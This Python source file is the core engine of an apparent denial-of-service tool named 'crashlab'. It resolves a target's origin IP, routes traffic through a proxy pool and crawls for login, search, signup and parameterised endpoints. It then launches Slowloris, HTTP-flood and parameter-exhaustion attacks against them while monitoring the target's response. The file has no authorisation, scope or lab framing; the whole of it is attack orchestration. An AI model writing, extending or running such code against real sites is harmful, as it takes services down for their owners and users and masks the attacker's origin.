import yaml
import time
import logging
from pathlib import Path
from crashlab.target import Target
from crashlab.proxies import ProxyPool
from crashlab.crawler import Crawler
from crashlab.attacks import Slowloris, HTTPFlood, ParamExhaust
from crashlab.reporter import start_monitor

logger = logging.getLogger("crashlab")

class CoreEngine:
    def __init__(self, config_path):
        self.config = self._load_config(config_path)
        self.target = Target(self.config['target']['base_url'])
        self.proxies = self._init_proxies()
        self.crawler = Crawler(self.target, self.proxies)
        self.interesting_endpoints = []

    def _load_config(self, path):
        with open(path) as f:
            cfg = yaml.safe_load(f)
        # Set safe defaults if missing
        if 'target' not in cfg or 'base_url' not in cfg['target']:
            raise ValueError("Configuration must contain 'target.base_url'")
        return cfg

    def _init_proxies(self):
        if self.config.get('proxies', {}).get('enabled', False):
            proxy_file = self.config['proxies'].get('proxy_list_file', 'proxies.txt')
            if Path(proxy_file).is_file():
                logger.info("Proxies enabled from %s", proxy_file)
                return ProxyPool(proxy_file)
        return None

    def override_target(self, url):
        self.target = Target(url)
        self.crawler.target = self.target

    def discover_endpoints(self):
        print(f"[*] Crawling {self.target.base_url} ...")
        self.crawler.crawl(self.target.base_url, 
                          max_depth=self.config.get('crawl', {}).get('max_depth', 3))

    def print_discovered(self):
        print("\n--- Discovered Endpoints ---")
        for name, lst in [
            ("Login", self.crawler.login_forms),
            ("Search", self.crawler.search_forms),
            ("Signup", self.crawler.signup_forms),
            ("Dynamic (query params)", self.crawler.dynamic_endpoints)
        ]:
            if lst:
                print(f"\n{name}:")
                for item in lst[:10]:
                    print(f"  {item}")

    def run(self, attack_mode):
        # Phase 1: Target IP
        ip = self.target.resolve_origin_ip()
        logger.info("Origin IP resolved: %s", ip)

        # Phase 2: Endpoint discovery
        self.discover_endpoints()
        # Build attack endpoint list
        all_ep = []
        for ep in self.crawler.login_forms + self.crawler.search_forms + self.crawler.signup_forms:
            all_ep.append(ep)  # (url, method, inputs)
        for url in self.crawler.dynamic_endpoints:
            # treat dynamic URLs as GET with a placeholder param
            all_ep.append((url, 'GET', ['q']))

        if not all_ep:
            logger.warning("No dynamic endpoints found. Falling back to root flood.")
            all_ep = [(self.target.base_url, 'GET', ['_'])]

        # Phase 3: Attack
        attacks = []
        if attack_mode in ("slowloris", "all"):
            attacks.append(Slowloris(self.target, self.config.get('attacks', {}).get('slowloris', {})))
        if attack_mode in ("flood", "all"):
            attacks.append(HTTPFlood(self.target, self.config.get('attacks', {}).get('http_flood', {})))
        if attack_mode in ("exhaust", "all"):
            attacks.append(ParamExhaust(self.target, all_ep, self.config.get('attacks', {}).get('param_exhaust', {})))

        if not attacks:
            print("[!] No attack selected.")
            return

        # Start monitoring console in background
        monitor_thread = start_monitor(self.target, interval=2)
        try:
            for attack in attacks:
                attack.launch()  # non-blocking, runs for configured duration
            # Wait for all attacks to complete (they run in threads)
            for attack in attacks:
                attack.join()
        finally:
            print("[*] Attacks finished. Stopping monitor.")
            monitor_thread.do_run = False
            monitor_thread.join(timeout=5)
